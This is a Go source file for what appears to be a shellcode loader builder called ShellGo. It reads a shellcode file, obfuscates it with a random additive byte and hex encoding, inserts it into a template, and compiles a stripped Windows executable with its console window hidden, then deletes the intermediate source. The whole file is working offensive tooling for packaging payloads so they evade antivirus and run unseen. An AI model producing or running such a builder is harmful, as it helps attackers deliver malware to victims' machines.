package main

import (
	"ShellcodeLoader/help"
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
)

func main() {
	compilacion := `go build -ldflags="-H=windowsgui -s -w" -o %s pay.go`

	if len(os.Args) >= 2 {
		switch os.Args[1] {
		case "--fullhelp", "-fullhelp", "-fh", "fh":
			FullHelp()
		case "-h", "--help", "h", "help":
			Help()

		case "x86", "86", "32", "x32":
			compilacion = `$env:GOARCH = "386"; go build -ldflags="-H=windowsgui -w -s" -o %s  pay.go`
		}
	} else {
		Help()
	}

	if len(os.Args) < 4 {
		Help()
	}
	shellcode, err := os.ReadFile(os.Args[2])
	Error("reading shellcode", err)

	N := make([]byte, 1)
	_, err = rand.Read(N)
	Error("read bytes", err)
	ShellcodeF := Obfuscate(shellcode, N[0])

	help.GoCode = bytes.Replace(help.GoCode, []byte("<<ShellCode>>"), ShellcodeF, 1)
	help.GoCode = bytes.Replace(help.GoCode, []byte("<<N>>"), []byte(strconv.Itoa(int(N[0]))), 1)
	err = os.WriteFile("pay.go", help.GoCode, 0644)
	Error("writing file", err)

	Name := os.Args[3]
	if filepath.Ext(Name) != ".exe" {
		Name += ".exe"
	}
	out, err := exec.Command("powershell", "-c", fmt.Sprintf(compilacion, Name)).CombinedOutput()
	Error(string(out), err)
	err = os.Remove("pay.go")
	Error("remove file", err)
}

func Obfuscate(s []byte, N byte) []byte {
	for i := range s {
		s[i] += N
	}
	str := hex.EncodeToString(s)
	var n uint = 0
	PayloadStr := []byte{118, 97, 114, 32, 98, 117, 102, 32, 61, 32, 91, 93, 98, 121, 116, 101, 40, 34, 34, 32, 43, 10, 34, 92, 120}
	var d uint = 0
	for _, i := range str {
		n++
		d++
		if d == 33 {
			PayloadStr = append(PayloadStr, []byte{34, 32, 43, 10, 34}...)
			d = 1
		}
		if n == 3 {
			PayloadStr = append(PayloadStr, []byte{92, 120}...)
			n = 1
		}
		PayloadStr = append(PayloadStr, []byte(string(i))...)
	}
	PayloadStr = append(PayloadStr, []byte{34, 44, 10, 41}...)
	return PayloadStr
}

func Error(inf string, err error) {
	if err != nil {
		fmt.Printf("Error %s: %s\n", inf, err)
		os.Exit(1)
	}
}

func Help() {
	fmt.Println("[*] Usage ./ShellGo x64/x86 loader.bin output.exe")
	fmt.Println("[!] To see the complete help use --fullhelp or -fh")
	os.Exit(1)
}

func FullHelp() {
	fmt.Println(`
[+] Help [+] 
First argument is to define if the compilation will be in 32 or 64 bits.
Second argument is to specify your shellcode to use.
The last argument for defining the output name.`)
	os.Exit(1)

}
